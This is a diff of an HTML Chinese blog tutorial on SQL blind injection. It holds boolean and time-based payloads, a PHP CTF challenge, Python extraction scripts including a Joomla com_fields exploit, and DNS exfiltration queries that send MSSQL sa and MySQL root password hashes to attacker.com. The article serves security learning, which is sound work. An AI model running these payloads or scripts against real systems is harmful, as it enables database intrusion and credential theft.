 </code></pre><h2 id="0X03-基于布尔的盲注"><a href="#0X03-基于布尔的盲注" class="headerlink" title="0X03 基于布尔的盲注"></a><strong>0X03 基于布尔的盲注</strong></h2><h3 id="1-使用条件"><a href="#1-使用条件" class="headerlink" title="1.使用条件"></a><strong>1.使用条件</strong></h3><p>基于布尔的盲注是在这样的一种情况下使用：页面虽然不能返回查询的结果，但是对于输入 布尔值 0 和 1 的反应是不同的，那我们就可以利用这个输入布尔值的注入点来注入我们的条件语句，从而能根据页面的返回情况推测出我们输入的语句是否正确(<strong>输入语句的真假直接影响整条查询语句最后查询的结果的真假</strong>)</p>
 <blockquote>
 <p><strong>注意：</strong></p>
@@ -228,7 +228,7 @@ mysql&gt; select 1 from bsqli order by if(1,1,(select count(*) from mysql.user g
 2 rows in set (0.39 sec)
 
 mysql&gt; select 1 from bsqli order by if(0,1,(select count(*) from mysql.user group by floor(rand(0)*2))) limit 0,3;
-ERROR 1062 (23000): Duplicate entry &apos;1&apos; for key &apos;group_key&apos;
+ERROR 1062 (23000): Duplicate entry &#39;1&#39; for key &#39;group_key&#39;
 </code></pre><p>其实不光是这条语句，很多报错注入的语句也可以直接拿来替换（当然并不是全部，比如 select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x  这个 payload 似乎就不能成功），这里只是一个小小的例子而已，关于这个语句为什么会报错，其实还是一个和有意思的探究，有兴趣的同学可以看一下这篇文章 <a href="https://www.cnblogs.com/xdans/p/5412468.html" target="_blank" rel="noopener">传送门</a></p>
 <p>构造条件语句还有很多方式，这不同的数据库中是由细微差别的，下表列出了一些例子</p>
 <p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A815.png" alt="此处输入图片的描述"></p>
@@ -284,29 +284,29 @@ Empty set (0.00 sec)
 
 session_start();
 require(&quot;conn.php&quot;);
-$action = isset($_GET[&apos;action&apos;]) ? $_GET[&apos;action&apos;] : &apos;&apos;;
+$action = isset($_GET[&#39;action&#39;]) ? $_GET[&#39;action&#39;] : &#39;&#39;;
 
 function filter($str){
-    $pattern = &quot;/ |\*|#|;|,|is|union|like|regexp|for|and|or|file|--|\||`|&amp;|&quot;.urldecode(&apos;%09&apos;).&quot;|&quot;.urldecode(&quot;%0a&quot;).&quot;|&quot;.urldecode(&quot;%0b&quot;).&quot;|&quot;.urldecode(&apos;%0c&apos;).&quot;|&quot;.urldecode(&apos;%0d&apos;).&quot;|&quot;.urldecode(&apos;%a0&apos;).&quot;/i&quot;;
+    $pattern = &quot;/ |\*|#|;|,|is|union|like|regexp|for|and|or|file|--|\||`|&amp;|&quot;.urldecode(&#39;%09&#39;).&quot;|&quot;.urldecode(&quot;%0a&quot;).&quot;|&quot;.urldecode(&quot;%0b&quot;).&quot;|&quot;.urldecode(&#39;%0c&#39;).&quot;|&quot;.urldecode(&#39;%0d&#39;).&quot;|&quot;.urldecode(&#39;%a0&#39;).&quot;/i&quot;;
     if(preg_match($pattern, $str)){
         die(&quot;hacker&quot;);
     }
     return $str;
 }
 
-    if($action === &apos;login&apos;){
-        $username = isset($_POST[&apos;username&apos;]) ? filter(strtolower(trim($_POST[&apos;username&apos;]))) : &apos;&apos;;
-        $password = isset($_POST[&apos;password&apos;]) ? md5($_POST[&apos;password&apos;]) : &apos;&apos;;
-        if($username == &apos;&apos;){
+    if($action === &#39;login&#39;){
+        $username = isset($_POST[&#39;username&#39;]) ? filter(strtolower(trim($_POST[&#39;username&#39;]))) : &#39;&#39;;
+        $password = isset($_POST[&#39;password&#39;]) ? md5($_POST[&#39;password&#39;]) : &#39;&#39;;
+        if($username == &#39;&#39;){
             die(&quot;Invalid username&quot;);
         }
-        $result = $mysqli-&gt;query(&quot;SELECT * FROM users WHERE username = &apos;{$username}&apos;&quot;);
+        $result = $mysqli-&gt;query(&quot;SELECT * FROM users WHERE username = &#39;{$username}&#39;&quot;);
         $row = mysqli_fetch_array($result);
-        if(isset($row[&apos;username&apos;])){
-            if($row[&apos;password&apos;] === $password){
-                $_SESSION[&apos;username&apos;] = $username;
-                $_SESSION[&apos;flag&apos;] = $row[&apos;flag&apos;];
-                header(&apos;Location: index.php?action=main&apos;);
+        if(isset($row[&#39;username&#39;])){
+            if($row[&#39;password&#39;] === $password){
+                $_SESSION[&#39;username&#39;] = $username;
+                $_SESSION[&#39;flag&#39;] = $row[&#39;flag&#39;];
+                header(&#39;Location: index.php?action=main&#39;);
             }
 
         }else{
@@ -315,15 +315,15 @@ function filter($str){
         }
         exit;
 
-    }elseif($action === &apos;main&apos;){
-        if(!isset($_SESSION[&apos;username&apos;])){
+    }elseif($action === &#39;main&#39;){
+        if(!isset($_SESSION[&#39;username&#39;])){
             header(&quot;Location: index.php&quot;);
             exit;
         }
 
-        echo &quot;Hello, &quot; . $_SESSION[&apos;username&apos;] . &quot;, &quot; . $_SESSION[&apos;flag&apos;] . &quot;&lt;br&gt;\n&quot;;
+        echo &quot;Hello, &quot; . $_SESSION[&#39;username&#39;] . &quot;, &quot; . $_SESSION[&#39;flag&#39;] . &quot;&lt;br&gt;\n&quot;;
     }else{
-        if(isset($_SESSION[&apos;username&apos;])){
+        if(isset($_SESSION[&#39;username&#39;])){
             header(&quot;Location: index.php?action=main&quot;);
             exit;
         }
@@ -345,16 +345,16 @@ data = {
     &quot;username&quot;: &quot;&quot;,
     &quot;password&quot;: &quot;123&quot;
 }
-payload = &quot;1&apos;^(ascii(mid((flag)from({})))&gt;{})^&apos;&quot;
+payload = &quot;1&#39;^(ascii(mid((flag)from({})))&gt;{})^&#39;&quot;
 flag = &quot;&quot;
 for i in xrange(1, 39):
     start = 32
     end = 126
     while start &lt; end:
         mid = (start + end) / 2
-        data[&apos;username&apos;] = payload.format(str(i), str(mid))
+        data[&#39;username&#39;] = payload.format(str(i), str(mid))
         r = requests.post(url, data = data)
-        if &apos;Invalid username or password&apos; not in r.content:
+        if &#39;Invalid username or password&#39; not in r.content:
             start = mid + 1
         else:
             end = mid
@@ -387,7 +387,7 @@ mysql&gt; select bin(~1);
 1 row in set (0.00 sec)
 
 mysql&gt; select * from bsqli where id = 1 and if(0,1,exp(~(select * from (select database())a)));
-ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(~((select `a`.`database()` from (select database() AS `database()`) `a`)))&apos;
+ERROR 1690 (22003): DOUBLE value is out of range in &#39;exp(~((select `a`.`database()` from (select database() AS `database()`) `a`)))&#39;
 </code></pre><h6 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a><strong>示例2：</strong></h6><pre><code>mysql&gt; select * from bsqli where id = 1 and  if(1,1,1-~1);
 +----+--------+----------+
 | id | name   | password |
@@ -397,7 +397,7 @@ ERROR 1690 (22003): DOUBLE value is out of range in &apos;exp(~((select `a`.`dat
 1 row in set (0.00 sec)
 
 mysql&gt; select * from bsqli where id = 1 and if(0,1,1-~1);
-ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &apos;(1 - ~(1))&apos;
+ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;(1 - ~(1))&#39;
 </code></pre><h5 id="5-使用-lt-lt-或-gt-gt"><a href="#5-使用-lt-lt-或-gt-gt" class="headerlink" title="5.使用 &lt;&lt; 或 &gt;&gt;"></a><strong>5.使用 &lt;&lt; 或 &gt;&gt;</strong></h5><p>这个想法来源于外国人的一个测试 <a href="https://www.exploit-db.com/papers/17073" target="_blank" rel="noopener">文章地址</a>，实际上这个方法是我们平时用的二分法的优化（好久没看这个 exploit-db 怎么变成这么炫酷了~ 逃</p>
 <p>因为这篇文章讲的可以说是文不加点了，所以我就直接将其中的一部分翻译过来做简单的说明</p>
 <p>我们想测试 user() 用户的第一个字符，我们需要像下面这样做</p>
@@ -439,53 +439,53 @@ ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &apos;(1 - ~(1))&ap
 +----------------------------------------+
 1 row in set (0.00 sec)
 </code></pre><p>最终的第一个字符的二进制是：<br>01110010</p>
-<pre><code>mysql&gt; select b&apos;01110010&apos;;
+<pre><code>mysql&gt; select b&#39;01110010&#39;;
 +-------------+
-| b&apos;01110010&apos; |
+| b&#39;01110010&#39; |
 +-------------+
 | r           |
 +-------------+
 1 row in set (0.00 sec)
 </code></pre><p><strong>最终的字符是 r</strong></p>
 <h5 id="6-一点点补充-1"><a href="#6-一点点补充-1" class="headerlink" title="6.一点点补充"></a><strong>6.一点点补充</strong></h5><p>同样补充一下关于 inster 和 update 的盲注示例</p>
-<pre><code>update users set username = &apos;0&apos; | (substr(user(),1,1) regexp 0x5e5b6d2d7a5d) where id=14;
+<pre><code>update users set username = &#39;0&#39; | (substr(user(),1,1) regexp 0x5e5b6d2d7a5d) where id=14;
 
-insert into users values (15,&apos;K0rz3n&apos;,&apos;0&apos;| (substr(user(),1,1) regexp 0x5e5b6d2d7a5d));
+insert into users values (15,&#39;K0rz3n&#39;,&#39;0&#39;| (substr(user(),1,1) regexp 0x5e5b6d2d7a5d));
 </code></pre><h2 id="0X04-数据提取方法"><a href="#0X04-数据提取方法" class="headerlink" title="0X04 数据提取方法"></a><strong>0X04 数据提取方法</strong></h2><p>由于是盲注，我们看不到我们的数据回显，我们只能根据返回去猜解，那么在对数据库一无所知的情况下我们只能一位一位地猜解，这里就会用到一些截断函数以及一些转换函数。</p>
 <p>比较常见的是 mid() substr() locate() position() substring() left() regexp  like  rlike length() char_length() ord() ascii() char() hex() 以及他们的同义函数等，当然这里还可能会需要很多的转换，比如过滤了等于号可以通过正则或者 in 或者大于小于号等替换之类的，这部分内容我会放在别的文章梳理一下，这里就不赘述了。</p>
 <h3 id="1-举几个简单的例子："><a href="#1-举几个简单的例子：" class="headerlink" title="1.举几个简单的例子："></a><strong>1.举几个简单的例子：</strong></h3><h4 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a><strong>示例1</strong></h4><p><strong>测试情况：</strong></p>
-<pre><code>1&apos;and if(length(database())=1,sleep(5),1) # 没有延迟
+<pre><code>1&#39;and if(length(database())=1,sleep(5),1) # 没有延迟
 
-1&apos;and if(length(database())=2,sleep(5),1) # 没有延迟
+1&#39;and if(length(database())=2,sleep(5),1) # 没有延迟
 
-1&apos;and if(length(database())=3,sleep(5),1) # 没有延迟
+1&#39;and if(length(database())=3,sleep(5),1) # 没有延迟
 
-1&apos;and if(length(database())=4,sleep(5),1) # 明显延迟
+1&#39;and if(length(database())=4,sleep(5),1) # 明显延迟
 </code></pre><p><strong>说明：</strong>数据库名字长度为 4 </p>
 <h4 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a><strong>示例2</strong></h4><p><strong>测试情况：</strong></p>
-<pre><code>1&apos;and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)# 明显延迟
+<pre><code>1&#39;and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)# 明显延迟
 …
-1&apos;and if(ascii(substr(database(),1,1))&lt;100,sleep(5),1)# 没有延迟
+1&#39;and if(ascii(substr(database(),1,1))&lt;100,sleep(5),1)# 没有延迟
 
-1&apos;and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)# 没有延迟
+1&#39;and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)# 没有延迟
 </code></pre><p><strong>说明:</strong>数据库名的第一个字符为小写字母d</p>
 <h4 id="示例3"><a href="#示例3" class="headerlink" title="示例3"></a><strong>示例3</strong></h4><p><strong>测试情况：</strong></p>
-<pre><code>index.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP &apos;^[a-f]&apos; AND
+<pre><code>index.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP &#39;^[a-f]&#39; AND
 ID=1)
 False
-index.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP &apos;^[0-9]&apos; AND
+index.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP &#39;^[0-9]&#39; AND
 ID=1)
 True
-index.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP &apos;^[0-4]&apos; AND
+index.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP &#39;^[0-4]&#39; AND
 ID=1)
 False
-index.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP &apos;^[5-9]&apos; AND
+index.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP &#39;^[5-9]&#39; AND
 ID=1)
 True
-index.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP &apos;^[5-7]&apos; AND
+index.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP &#39;^[5-7]&#39; AND
 ID=1)
 True
-index.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP &apos;^5&apos; AND
+index.php?id=1 and 1=(SELECT 1 FROM users WHERE password REGEXP &#39;^5&#39; AND
 ID=1)
 True
 </code></pre><p><strong>说明:</strong>密码 hash 的第一个字符为5</p>
@@ -513,27 +513,27 @@ True
 import requests
 import sys
 # 准备工作
-url = &apos;http://localhost/Joomla/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=&apos;
-string = &apos;0123456789ABCDEFGHIGHLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&apos;
-flag = &apos;&apos;
-cookies = {&apos;9e44025326f96e2d9dc1a2aab2dbe5b1&apos; : &apos;l1p92lf44gi4s7jdf5q73l0bt5&apos;}
-response = requests.get(&apos;http://localhost/Joomla/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(CASE WHEN (ascii(substr((select database()),1,1)) &gt; 78) THEN 1 ELSE (SELECT 1 FROM DUAL UNION SELECT 2 FROM DUAL) END)&apos;,cookies=cookies,timeout=2)
+url = &#39;http://localhost/Joomla/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=&#39;
+string = &#39;0123456789ABCDEFGHIGHLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#39;
+flag = &#39;&#39;
+cookies = {&#39;9e44025326f96e2d9dc1a2aab2dbe5b1&#39; : &#39;l1p92lf44gi4s7jdf5q73l0bt5&#39;}
+response = requests.get(&#39;http://localhost/Joomla/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=(CASE WHEN (ascii(substr((select database()),1,1)) &gt; 78) THEN 1 ELSE (SELECT 1 FROM DUAL UNION SELECT 2 FROM DUAL) END)&#39;,cookies=cookies,timeout=2)
 print(response.text)
 i = 1
 while i &lt;= 7:
     left = 0
     right = len(string) - 1
     mid = int((left + right) / 2)
-    print(&apos;\n&apos;)
+    print(&#39;\n&#39;)
     print(flag)
-    print(&apos;Testing... &apos; + str(left) + &apos; &apos; + str(right))
+    print(&#39;Testing... &#39; + str(left) + &#39; &#39; + str(right))
     # 特殊情况
     if (right - left) == 1:
         payload = &quot;(CASE WHEN (ascii(substr((select database()),{0},1))&gt;{1}) THEN 1 ELSE (SELECT 1 FROM DUAL UNION SELECT 2 FROM DUAL) END)&quot;.format(i, str(ord(string[left])))
         poc = url + payload
         print(poc)
         response = requests.get(poc,cookies=cookies,timout=2)
-        if (&apos;安全令牌无效&apos;) in response.text:
+        if (&#39;安全令牌无效&#39;) in response.text:
             flag = flag + string[right]
             print(flag)
             exit()
@@ -549,13 +549,13 @@ while i &lt;= 7:
         print(poc)
         response = requests.get(poc,cookies=cookies,timeout=2)
         # 右半部
-        if (&apos;安全令牌无效&apos;) in response.text:
+        if (&#39;安全令牌无效&#39;) in response.text:
             left = mid + 1
-            print(&apos;left:&apos;+str(left))
+            print(&#39;left:&#39;+str(left))
         # 左半部
         else: 
             right = mid
-            print(&apos;right:&apos;+str(right))
+            print(&#39;right:&#39;+str(right))
         if (left == right):
             flag = flag + string[left]
             break
@@ -565,7 +565,7 @@ while i &lt;= 7:
             poc = url + payload
             print(poc)
             response = requests.get(poc,cookies=cookies,timeout=2)
-            if (&apos;安全令牌无效&apos;) in response.text:
+            if (&#39;安全令牌无效&#39;) in response.text:
                 flag = flag + string[right]
                 print(flag)
                 break
@@ -588,40 +588,40 @@ print(flag)
 <pre><code>\\ComputerName\SharedFolder\Resource
 </code></pre><p>通过将 ComputerName 设置为自定义的地址的值，攻击者能够完成攻击，下面是可以利用的扩展。存储过程。</p>
 <h4 id="1-master-xp-dirtree"><a href="#1-master-xp-dirtree" class="headerlink" title="1.master..xp_dirtree"></a><strong>1.master..xp_dirtree</strong></h4><p>这个扩展存储过程用来获取指定的目录列表和其所有子目录，使用方式如下：</p>
-<pre><code>master..xp_dirtree &apos;&lt;dirpath&gt;&apos;
+<pre><code>master..xp_dirtree &#39;&lt;dirpath&gt;&#39;
 </code></pre><p>比如想要获取 C:\Windows 目录下的所有目录及其子目录</p>
-<pre><code>EXEC master..xp_dirtree &apos;C:\Windows&apos;;
+<pre><code>EXEC master..xp_dirtree &#39;C:\Windows&#39;;
 </code></pre><h4 id="2-master-xp-fileexist"><a href="#2-master-xp-fileexist" class="headerlink" title="2.master..xp_fileexist"></a><strong>2.master..xp_fileexist</strong></h4><p>这个扩展存储过程能判断某一文件是否在磁盘上，使用方式如下：</p>
-<pre><code>xp_fileexist &apos;&lt;filepath&gt;&apos;
+<pre><code>xp_fileexist &#39;&lt;filepath&gt;&#39;
 </code></pre><p>例如想要检查 boot.ini 这个文件是否在 C盘 </p>
-<pre><code>EXEC master..xp_fileexist &apos;C:\boot.ini&apos;;
+<pre><code>EXEC master..xp_fileexist &#39;C:\boot.ini&#39;;
 </code></pre><h4 id="3-master-xp-subdirs"><a href="#3-master-xp-subdirs" class="headerlink" title="3.master..xp_subdirs"></a><strong>3.master..xp_subdirs</strong></h4><p>这个扩展存储过程可以给出指定的目录下的所有目录列表，使用方式如下：</p>
-<pre><code>master..xp_subdirs &apos;&lt;dirpath&gt;&apos;
+<pre><code>master..xp_subdirs &#39;&lt;dirpath&gt;&#39;
 </code></pre><p>例如：列出 C:\Windows 下的所有第一层子目录</p>
-<pre><code>EXEC master..xp_subdirs &apos;C:\Windows&apos;;
+<pre><code>EXEC master..xp_subdirs &#39;C:\Windows&#39;;
 </code></pre><h4 id="4-实战案例"><a href="#4-实战案例" class="headerlink" title="4.实战案例"></a><strong>4.实战案例</strong></h4><p>下面的例子讲述的是如何通过 master..xp_dirtree() 这个扩展存储过程将 sa 的密码的 哈希值通过 DNS 请求外带</p>
 <pre><code>DECLARE @host varchar(1024);
 SELECT @host=(SELECT TOP 1
 master.dbo.fn_varbintohexstr(password_hash)
-FROM sys.sql_logins WHERE name=&apos;sa&apos;)
-+&apos;.attacker.com&apos;;
-EXEC(&apos;master..xp_dirtree &quot;\\&apos;+@host+&apos;\foobar$&quot;&apos;);
+FROM sys.sql_logins WHERE name=&#39;sa&#39;)
++&#39;.attacker.com&#39;;
+EXEC(&#39;master..xp_dirtree &quot;\\&#39;+@host+&#39;\foobar$&quot;&#39;);
 </code></pre><p>使用此预先计算形式是因为扩展存储过程不接受子查询作为给定参数值。 因此使用临时变量来存储SQL查询的结果。</p>
 <h3 id="3-针对-Oracle"><a href="#3-针对-Oracle" class="headerlink" title="3.针对 Oracle"></a><strong>3.针对 Oracle</strong></h3><p>Oracle提供了一套PL / SQL软件包及其Oracle数据库服务器来扩展数据库功能。 其中几个特别适用于网络访问，从而能很好地在攻击中加以利用。</p>
 <h4 id="1-UTL-INADDR-GET-HOST-ADDRESS"><a href="#1-UTL-INADDR-GET-HOST-ADDRESS" class="headerlink" title="1.UTL_INADDR.GET_HOST_ADDRESS"></a><strong>1.UTL_INADDR.GET_HOST_ADDRESS</strong></h4><p>包UTL_INADDR提供了Internet寻址支持 - 例如检索本地和远程主机的主机名和IP地址。 其中成员函数 GET_HOST_ADDRESS（）<br>检索指定主机的IP地址，使用方法：</p>
-<pre><code>UTL_INADDR.GET_HOST_ADDRESS（&apos;&lt;host&gt;&apos;）
+<pre><code>UTL_INADDR.GET_HOST_ADDRESS（&#39;&lt;host&gt;&#39;）
 </code></pre><p>例如，要获取主机test.example.com的IP地址，</p>
-<pre><code>SELECT UTL_INADDR.GET_HOST_ADDRESS（&apos;test.example.com&apos;）;
+<pre><code>SELECT UTL_INADDR.GET_HOST_ADDRESS（&#39;test.example.com&#39;）;
 </code></pre><h4 id="2-UTL-HTTP-REQUEST"><a href="#2-UTL-HTTP-REQUEST" class="headerlink" title="2.UTL_HTTP.REQUEST"></a><strong>2.UTL_HTTP.REQUEST</strong></h4><p>包UTL_HTTP从SQL和PL / SQL发出HTTP调用。 它的方法 REQUEST（）可以返回从给定地址获取的前2000个字节的数据，使用方法：</p>
-<pre><code>UTL_HTTP.REQUEST(&apos;&lt;url&gt;&apos;)
+<pre><code>UTL_HTTP.REQUEST(&#39;&lt;url&gt;&#39;)
 </code></pre><p>例如，想获取 <a href="http://test.example.com/index.php开头的" target="_blank" rel="noopener">http://test.example.com/index.php开头的</a> 2000 字节数据</p>
-<pre><code>SELECT UTL_HTTP.REQUEST(&apos;http://test.example.com/index.php&apos;) FROM DUAL;
+<pre><code>SELECT UTL_HTTP.REQUEST(&#39;http://test.example.com/index.php&#39;) FROM DUAL;
 </code></pre><h4 id="3-HTTPURITYPE-GETCLOB"><a href="#3-HTTPURITYPE-GETCLOB" class="headerlink" title="3.HTTPURITYPE.GETCLOB"></a><strong>3.HTTPURITYPE.GETCLOB</strong></h4><p>类HTTPURITYPE的实例方法GETCLOB（）返回从给定地址检索的 <a href="https://baike.baidu.com/item/CLOB/6327280" target="_blank" rel="noopener">Character Large Object（CLOB）</a>，使用方法：</p>
-<pre><code>HTTPURITYPE(&apos;&lt;url&gt;&apos;).GETCLOB()
+<pre><code>HTTPURITYPE(&#39;&lt;url&gt;&#39;).GETCLOB()
 </code></pre><p>例如，要从位于<a href="http://test.example.com/index.php的页面启动内容检索，请运行：" target="_blank" rel="noopener">http://test.example.com/index.php的页面启动内容检索，请运行：</a></p>
-<pre><code>SELECT HTTPURITYPE(&apos;http://test.example.com/index.php&apos;).GETCLOB() FROM DUAL;
+<pre><code>SELECT HTTPURITYPE(&#39;http://test.example.com/index.php&#39;).GETCLOB() FROM DUAL;
 </code></pre><h4 id="4-DBMS-LDAP-INIT"><a href="#4-DBMS-LDAP-INIT" class="headerlink" title="4.DBMS_LDAP.INIT"></a><strong>4.DBMS_LDAP.INIT</strong></h4><p>包 DBMS_LDAP 使 PL/SQL程序员能够从轻量级目录访问协议（LDAP）服务器访问数据。 它的INIT（）过程用于初始化LDAP服务器的会话，</p>
-<pre><code>DBMS_LDAP.INIT((&apos;&lt;host&gt;&apos;,&lt;port&gt;)
+<pre><code>DBMS_LDAP.INIT((&#39;&lt;host&gt;&#39;,&lt;port&gt;)
 </code></pre><p>例如 与 主机 test.example.com 初始化一个链接</p>
 <pre><code>SELECT
 </code></pre><p>DBMS_LDAP.INIT((‘test.example.com’,80) FROM<br>DUAL;</p>
@@ -650,13 +650,13 @@ mysql&gt; select @@secure_file_priv;
 1 row in set (0.00 sec)
 </code></pre><p>此时我的 mysql 这个选项没有设置，所以可以使用这个方法</p>
 <h4 id="1-LOAD-FILE"><a href="#1-LOAD-FILE" class="headerlink" title="1.LOAD_FILE"></a><strong>1.LOAD_FILE</strong></h4><p>mysql 的 LOAD_FILE() 能读取文件内容然后返回对应的字符串，使用方法</p>
-<pre><code>LOAD_FILE(&apos;&lt;filepath&gt;&apos;)
+<pre><code>LOAD_FILE(&#39;&lt;filepath&gt;&#39;)
 </code></pre><p>例如想获取 C:\Windows\system.ini 的内容</p>
-<pre><code>SELECT LOAD_FILE(&apos;C:\\Windows\\system.ini&apos;);
+<pre><code>SELECT LOAD_FILE(&#39;C:\\Windows\\system.ini&#39;);
 </code></pre><h4 id="2-实战案例"><a href="#2-实战案例" class="headerlink" title="2.实战案例"></a><strong>2.实战案例</strong></h4><p>以下是使用MySQL函数LOAD_FILE（）通过DNS解析机制推送系统管理员（root）密码哈希的示例：</p>
-<pre><code>SELECT LOAD_FILE(CONCAT(&apos;\\\\&apos;,(SELECT password FROM mysql.user WHERE user=&apos;root&apos; LIMIT 1),&apos;.attacker.com\\foobar&apos;));
+<pre><code>SELECT LOAD_FILE(CONCAT(&#39;\\\\&#39;,(SELECT password FROM mysql.user WHERE user=&#39;root&#39; LIMIT 1),&#39;.attacker.com\\foobar&#39;));
 </code></pre><p>我本地也做了对应的测试</p>
-<pre><code>select load_file(concat(&apos;\\\\&apos;,@@version,&apos;.9a56627dc016fc8b5c6e.d.zhack.ca\\a.txt&apos;));
+<pre><code>select load_file(concat(&#39;\\\\&#39;,@@version,&#39;.9a56627dc016fc8b5c6e.d.zhack.ca\\a.txt&#39;));
 </code></pre><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SQL%E7%9B%B2%E6%B3%A822.png" alt="此处输入图片的描述"></p>
 <p>当然我们可以对这个 payload 进行必要的编码</p>
 <pre><code>select load_file(concat(0x5c5c5c5c,@@version,0x2E62383862306437653533326238663635333164322E642E7A6861636B2E63615C5C612E747874));
@@ -665,11 +665,11 @@ mysql&gt; select @@secure_file_priv;
 <p><strong>注意:</strong> mysql 编码的时候每个反斜线都要加一个反斜线来转义</p>
 </blockquote>
 <p>这种方式可以用于 union 和 error-base 的 sqli 中，如下</p>
-<pre><code>http://192.168.0.100/?id=-1&apos;+union+select+1,load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874)),3-- -
+<pre><code>http://192.168.0.100/?id=-1&#39;+union+select+1,load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874)),3-- -
 
-http://192.168.0.100/?id=-1&apos; or !(select*from(select   load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874)))x)-~0-- -
+http://192.168.0.100/?id=-1&#39; or !(select*from(select   load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874)))x)-~0-- -
 
-http://192.168.0.100/?id=-1&apos; or exp(~(select*from(select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874)))a))-- -
+http://192.168.0.100/?id=-1&#39; or exp(~(select*from(select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874)))a))-- -
 </code></pre><p>当然除了or 你还可以用以下 ||, |, and, &amp;&amp;, &amp;, &gt;&gt;, &lt;&lt;, ^, xor, &lt;=, &lt;, ,&gt;, &gt;=, *, mul, /, div, -, +, %, mod.</p>
 <h3 id="5-sqlmap-的扩展"><a href="#5-sqlmap-的扩展" class="headerlink" title="5.sqlmap 的扩展"></a><strong>5.sqlmap 的扩展</strong></h3><p>由于这种在攻击中方便快捷的特性，sqlmap 也进行了响应的扩展来支持这种攻击方式，添加了新的命令行参数 –dns-domain</p>
 <p>使用时指定对应的服务器     </p>
@@ -678,4 +678,4 @@ http://192.168.0.100/?id=-1&apos; or exp(~(select*from(select load_file(concat(0
 <p>另外每个得到的DNS解析请求都被编码为十六进制格式，因为这是DNS域名的（事实上的）标准,这样就可以保留所有最终的非单词字符。此外，较长的SQL查询结果的十六进制表示被分成几部分,这样做是因为完整域名内的每个节点的标签（例如.example.）的长度限制为63个字符。</p>
 <h2 id="0X06-总结"><a href="#0X06-总结" class="headerlink" title="0X06 总结"></a><strong>0X06 总结</strong></h2><p>由于 SQLi 的涉及内容太多，我想来想去觉得一篇文章肯定不能全部涵盖，于是这篇文章主要讲的是一些我在宏观上对 SQLi 盲注的理解，其他的关于 SQLi Bypass 的内容准备再开一个坑，由于篇幅原因，和时间仓促，文中有些内容难免出现不完善或者错误的情况，请师傅们不吝赐教。</p>
 <h2 id="0X07-参考链接"><a href="#0X07-参考链接" class="headerlink" title="0X07 参考链接"></a><strong>0X07 参考链接</strong></h2><p><a href="http://www.sqlinjection.net/heavy-query/" target="_blank" rel="noopener">http://www.sqlinjection.net/heavy-query/</a><br><a href="https://skysec.top/2018/04/04/pwnhub-time-injection%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%96%B0%E6%80%9D%E8%B7%AF/" target="_blank" rel="noopener">https://skysec.top/2018/04/04/pwnhub-time-injection%E5%B8%A6%E6%9D%A5%E7%9A%84%E6%96%B0%E6%80%9D%E8%B7%AF/</a><br><a href="http://php.net/manual/zh/features.persistent-connections.php" target="_blank" rel="noopener">http://php.net/manual/zh/features.persistent-connections.php</a><br><a href="https://www.freebuf.com/articles/web/30841.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/30841.html</a><br><a href="https://www.cnblogs.com/xdans/p/5412468.html" target="_blank" rel="noopener">https://www.cnblogs.com/xdans/p/5412468.html</a><br><a href="https://www.exploit-db.com/papers/17073" target="_blank" rel="noopener">https://www.exploit-db.com/papers/17073</a><br><a href="https://www.freebuf.com/articles/web/175049.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/175049.html</a><br><a href="https://www.jianshu.com/p/95c814c515a2" target="_blank" rel="noopener">https://www.jianshu.com/p/95c814c515a2</a><br><a href="https://www.cnblogs.com/ichunqiu/archive/2018/07/24/9360317.html" target="_blank" rel="noopener">https://www.cnblogs.com/ichunqiu/archive/2018/07/24/9360317.html</a><br><a href="https://www.exploit-db.com/exploits/42033" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/42033</a><br><a href="https://www.freebuf.com/vuls/138838.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/138838.html</a><br><a href="https://osandamalith.com/2017/03/13/mysql-blind-injection-in-insert-and-update-statements/" target="_blank" rel="noopener">https://osandamalith.com/2017/03/13/mysql-blind-injection-in-insert-and-update-statements/</a></p>
